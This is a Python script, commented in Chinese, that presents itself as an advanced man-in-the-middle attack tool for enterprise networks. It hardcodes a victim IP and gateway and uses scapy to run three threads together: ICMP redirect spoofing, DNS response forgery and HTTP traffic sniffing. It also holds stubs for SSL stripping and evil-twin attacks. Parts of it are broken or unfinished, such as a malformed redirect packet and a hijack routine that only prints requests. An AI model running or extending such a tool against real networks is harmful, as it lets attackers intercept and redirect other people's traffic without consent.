#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
高级中间人攻击工具
针对有防护的企业网络环境
"""

import threading
import time
import socket
import subprocess
from scapy.all import *
import sys

class AdvancedMITMAttack:
    def __init__(self):
        self.target_ip = "10.30.58.185"
        self.gateway_ip = "10.30.255.254"
        self.local_ip = socket.gethostbyname(socket.gethostname())
        self.attack_running = False
        
    def get_local_mac(self):
        """获取本机MAC地址"""
        try:
            interfaces = get_if_list()
            for iface in interfaces:
                if iface != 'lo':
                    try:
                        mac = get_if_hwaddr(iface)
                        if mac != '00:00:00:00:00:00':
                            return mac
                    except:
                        pass
        except:
            pass
        return None
    
    def technique1_icmp_redirect(self):
        """技术1: ICMP重定向攻击"""
        print("🎯 尝试ICMP重定向攻击...")
        
        local_mac = self.get_local_mac()
        if not local_mac:
            print("❌ 无法获取本机MAC")
            return False
        
        try:
            # 创建ICMP重定向包
            # 告诉目标设备：使用更优的路由（即我们的电脑）
            icmp_packet = IP(src=self.gateway_ip, dst=self.target_ip)/ICMP(type=5, code=1)/\
                         IP(src=self.target_ip, dst="8.8.8.8")/\
                         IP(src=self.gateway_ip, dst=self.local_ip)
            
            # 发送ICMP重定向
            send(icmp_packet, verbose=False)
            print("✅ ICMP重定向包已发送")
            return True
            
        except Exception as e:
            print(f"❌ ICMP重定向失败: {e}")
            return False
    
    def technique2_dns_spoofing(self):
        """技术2: DNS欺骗攻击"""
        print("🎯 尝试DNS欺骗攻击...")
        
        # 监听DNS查询并返回虚假响应
        def dns_spoof(pkt):
            if pkt.haslayer(DNSQR):  # DNS查询包
                # 伪造DNS响应
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                             UDP(dport=pkt[UDP].sport, sport=53)/\
                             DNS(id=pkt[DNS].id, 
                                 qr=1,  # 响应
                                 aa=1,  # 权威回答
                                 qd=pkt[DNS].qd,
                                 an=DNSRR(rrname=pkt[DNS].qd.qname, 
                                         type='A', 
                                         ttl=600, 
                                         rdata="8.8.8.8"))  # 重定向到谷歌DNS
                
                send(spoofed_pkt, verbose=False)
                print(f"🔧 DNS欺骗: {pkt[DNS].qd.qname} -> 8.8.8.8")
        
        try:
            # 开始嗅探DNS流量
            sniff(filter="udp port 53", prn=dns_spoof, store=0, timeout=30)
            return True
        except Exception as e:
            print(f"❌ DNS欺骗失败: {e}")
            return False
    
    def technique3_http_hijack(self):
        """技术3: HTTP流量劫持"""
        print("🎯 尝试HTTP流量劫持...")
        
        def http_hijack(pkt):
            if pkt.haslayer(TCP) and pkt[TCP].dport == 80:  # HTTP流量
                # 检查是否是HTTP请求
                if pkt.haslayer(Raw):
                    http_data = pkt[Raw].load.decode('utf-8', errors='ignore')
                    if 'GET' in http_data or 'POST' in http_data:
                        print(f"🔍 检测到HTTP请求: {http_data.split('\\n')[0]}")
                        
                        # 可以在这里修改HTTP请求
                        # 例如重定向到其他网站
        
        try:
            # 嗅探HTTP流量
            sniff(filter="tcp port 80", prn=http_hijack, store=0, timeout=30)
            return True
        except Exception as e:
            print(f"❌ HTTP劫持失败: {e}")
            return False
    
    def technique4_ssl_strip(self):
        """技术4: SSL剥离攻击"""
        print("🎯 尝试SSL剥离攻击...")
        
        # 这种攻击比较复杂，需要更多设置
        print("💡 SSL剥离需要更复杂的配置")
        print("💡 建议在专门的测试环境中进行")
        return False
    
    def technique5_evil_twin(self):
        """技术5: 邪恶双胞胎攻击（需要无线网络）"""
        print("🎯 邪恶双胞胎攻击分析...")
        
        # 检查是否是无线网络
        try:
            result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], 
                                  capture_output=True, text=True)
            if '无线' in result.stdout or 'WLAN' in result.stdout:
                print("✅ 检测到无线网络连接")
                print("💡 可以尝试邪恶双胞胎攻击")
                return True
            else:
                print("❌ 未检测到无线网络")
                return False
        except:
            print("❌ 无线网络检测失败")
            return False
    
    def run_advanced_attacks(self):
        """运行高级攻击组合"""
        print("=" * 70)
        print("          高级中间人攻击工具")
        print("=" * 70)
        print(f"目标IP: {self.target_ip}")
        print(f"网关IP: {self.gateway_ip}")
        print(f"本机IP: {self.local_ip}")
        print("\n💡 检测到企业级网络防护")
        print("💡 使用高级攻击技术...")
        
        self.attack_running = True
        
        # 创建攻击线程
        attack_threads = []
        
        # 技术1: ICMP重定向
        t1 = threading.Thread(target=self.technique1_icmp_redirect)
        attack_threads.append(t1)
        
        # 技术2: DNS欺骗
        t2 = threading.Thread(target=self.technique2_dns_spoofing)
        attack_threads.append(t2)
        
        # 技术3: HTTP劫持
        t3 = threading.Thread(target=self.technique3_http_hijack)
        attack_threads.append(t3)
        
        # 启动所有攻击
        for t in attack_threads:
            t.daemon = True
            t.start()
        
        # 运行30秒
        print("\n⏰ 攻击运行中 (30秒)...")
        for i in range(30):
            if not self.attack_running:
                break
            print(f"   {30-i}秒后停止...")
            time.sleep(1)
        
        self.attack_running = False
        print("\n✅ 攻击已停止")
        
        # 等待线程结束
        for t in attack_threads:
            t.join(timeout=5)
    
    def stop_attacks(self):
        """停止所有攻击"""
        self.attack_running = False
        print("🛑 停止所有攻击")

def main():
    """主函数"""
    attack = AdvancedMITMAttack()
    
    try:
        attack.run_advanced_attacks()
    except KeyboardInterrupt:
        attack.stop_attacks()
    except Exception as e:
        print(f"❌ 攻击失败: {e}")

if __name__ == "__main__":
    main()